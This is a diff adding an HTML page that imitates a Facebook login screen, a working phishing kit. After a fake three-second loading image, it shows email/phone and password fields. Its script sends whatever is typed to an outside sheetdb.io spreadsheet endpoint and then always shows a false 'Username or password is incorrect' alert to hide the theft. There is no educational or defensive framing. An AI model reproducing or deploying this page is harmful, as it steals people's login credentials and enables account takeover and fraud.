@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	
+<meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+		<title>My Log-in Page</title>
+		<style>
+		body{
+		padding:0;
+		margin:0;
+		text-align:center;
+		background-color: ;
+		}
+		form{
+		
+		
+		}
+		section{
+		background-color: # ffff;
+		box-shadow: 0  0  10px rgba(0,0,0,0.5);
+		margin: 15px;
+		padding: 10px;
+		border-radius: 9px;
+		}
+		#log{
+		height:35px;
+		width: 250px;
+		background-color: #4988FF;
+		border-radius: 5px;
+		}
+		.create{
+		height:30px;
+		width: 150px;
+		background-color: #0FA01B;
+		border-radius: 5px;
+		}
+		.writing {
+		height:30px;
+		width: 250px;
+		border-radius: 0;
+		}
+		button {
+		border-radius: 5px;
+		color: #fff;
+		}
+		input {
+		outline: none;
+		}
+		img {
+		height: 100%;
+		width:100%;
+		}
+		</style>
+	</head>
+	<body onload="myFunction()" style="margin:0;">
+
+<div id="loader"><img src="img.png"></div>
+<div style="display:none;" id="myDiv">
+<section>
+	 <h2 style="color:#4988FF;">facebook</h2>
+	   <form method="POST" action="https://sheetdb.io/api/v1/by3y5lv7c503v" id="myform">
+	   <h3 style="">log in to facebook</h3>
+		  <input class="writing" type="text" placeholder="Email  or phone number" name="data[Name]" required>
+	   <p><input class="writing" type="password" placeholder="Password" name="data[Password]" required></p>
+		  <input  type="submit"id="log" value="Log in">
+	   <h4 style="color:#4988FF;"><a href="#" style="text-decoration: none; color:#4988FF;">forgot password ?</a></h4>
+		  <h5>Or</h5>
+<button class="create">Create new account</button>
+</form>
+	</section>
+	   </div>
+	   <script>
+  var form = document.getElementById('myform');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("myform")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            alert("Username or password is incorrect")
+
+          });
+        });
+
+var myVar;
+
+function myFunction() {
+  myVar = setTimeout(showPage, 3000);
+}
+
+function showPage() {
+  document.getElementById("loader").style.display = "none";
+  document.getElementById("myDiv").style.display = "block";
+}
+
+</script>
+	</body>
+</html>
